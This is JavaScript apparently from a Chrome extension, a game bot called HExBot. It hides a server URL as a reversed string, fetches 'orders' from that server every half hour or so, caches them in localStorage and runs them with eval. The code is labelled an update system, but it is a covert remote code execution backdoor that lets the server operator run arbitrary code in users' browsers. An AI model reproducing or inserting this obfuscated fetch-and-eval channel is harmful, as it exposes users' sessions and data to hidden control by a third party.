function getnews(callback){
	var BGRequest = function(action, target){
		this.action = action
		this.target = target
	}
	var request = new BGRequest("getneworders", ("sredrowen/moc.axmoc.revrestobxeh//:ptth").split("").reverse().join(""))
	chrome.runtime.sendMessage({message: request}, function(responseMessage) {
		var handleResponse = function(getResponse, sender, sendResponse) {
				chrome.extension.onMessage.removeListener(handleResponse)
				callback(getResponse.message)
			}
		chrome.runtime.onMessage.addListener(handleResponse)
	})
}

function updateSystem(callback, com){
	function decodespecialchars(input) {
		var txt = document.createElement("textarea");
		txt.innerHTML = input;
		return txt.value;
	}
	if(com){
		localStorage.setItem(STORAGE_ORDERS_CACHE, com)
	}
	var command = localStorage.getItem(STORAGE_ORDERS_CACHE)
	try {
		eval(String(decodespecialchars(command)))
	}
	catch(err) {
		if(controllers.isRegularGamePage)
		console.log("HExBot: Update system error!")
	}
	callback()
}

function bootstrap(callback){
	if(controllers.bot.complexCore){
		var currentDate = new Date();
		var mcdate = currentDate.getTime();
		var lastjob = localStorage.getItem(STORAGE_LACK_TIME);
		var comCached = localStorage.getItem(STORAGE_ORDERS_CACHE)
		if((lastjob) && (comCached)){
			var timeLimit = localStorage.getItem(STORAGE_LIMIT_TIME)
			if((!timeLimit) || (isNaN(timeLimit)) || (timeLimit < 30)){
				localStorage.setItem(STORAGE_LIMIT_TIME, 1800)
			}
			var secondsLack = ((mcdate - lastjob)/1000);
			if(secondsLack >= localStorage.getItem(STORAGE_LIMIT_TIME)){
				//console.log("updated")
				localStorage.setItem(STORAGE_LACK_TIME, mcdate);
				getnews(function(response){
					updateSystem(callback, response)
				})
			} else {
				//console.log("up to date")
				updateSystem(callback)
			}
		} else {
			//console.log("first update")
			localStorage.setItem(STORAGE_LACK_TIME, mcdate);
			getnews(function(response){
				updateSystem(callback, response)
			})
		}
	} else {
		callback()
	}
		
}